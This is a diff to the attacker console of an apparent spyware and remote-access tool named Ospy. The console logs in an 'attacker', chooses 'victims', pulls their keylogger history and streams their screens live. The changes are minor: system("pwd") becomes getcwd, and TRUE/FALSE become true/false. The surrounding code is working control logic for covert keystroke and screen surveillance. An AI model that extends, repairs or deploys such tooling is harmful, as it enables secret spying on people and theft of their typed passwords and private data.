@@ -44,8 +44,10 @@ int main (){
 		connecting_load();
 	#endif
 	
+	char pwd[100];
+	getcwd(pwd, sizeof(pwd)); // set in "pwd" the current path
 	int attacker_input;
-	int left_welcome_page = FALSE;
+	int left_welcome_page = false;
 	char encrypted_keystroke[ENCRYPTED_TEXT_LEN(LICENSE_KEY_LENGTH)];
 	
 	// welcome page - entering the attacker to Ospy
@@ -60,7 +62,7 @@ int main (){
 		switch (attacker_input) {
 			case '1':
 				if(log_in_attacker() == ENTERING_ACTION_SUCCESS)
-					left_welcome_page = TRUE;
+					left_welcome_page = true;
 				break;
 			case '2':
 				register_attacker();
@@ -89,9 +91,7 @@ int main (){
 				fflush(stdout);
 				if (recv_file(selected_victim_name, "keylogger", ".txt", "keylogger_history") == FILE_RECEIVED){
 					printf("\r[\033[32;1m+\033[0m]\033[1m\033[32m %s's keylogger history file saved successfully\033[0m\n", selected_victim_name);
-					printf("\r[»] Ospy folder path : ");
-					fflush(stdout);
-					system("pwd");
+					printf("\r[»] Ospy folder path : %s/Ospy", pwd);
 					press_enter_to_continue();
 				}
 				else {	
@@ -117,9 +117,7 @@ int main (){
 				signal(SIGINT, stop_screen_stream_sig);
 				A_2_S_encrypted_message_handler(data, GET_SCREEN_STREAM);
 				printf("\r[\033[32;1m+\033[0m] \033[1m\033[32m%s's live screen stream started successfully\033[0m\n", selected_victim_name);
-				printf("\r[»] Ospy folder path : ");
-				fflush(stdout);
-				system("pwd");
+				printf("\r[»] Ospy folder path : %s/Ospy", pwd);
 				while (keepRunningscreen){ // it the attacker will press ^C, SIGINT signal will sand to 'stop_screen_stream_sig'
 					recv_file(selected_victim_name, "screenshot", ".jpg", "screenshots");
 				}	
@@ -196,7 +194,6 @@ int main (){
 				}
 				
 				break;
-				
 			case '8':
 				choose_victim();
 				
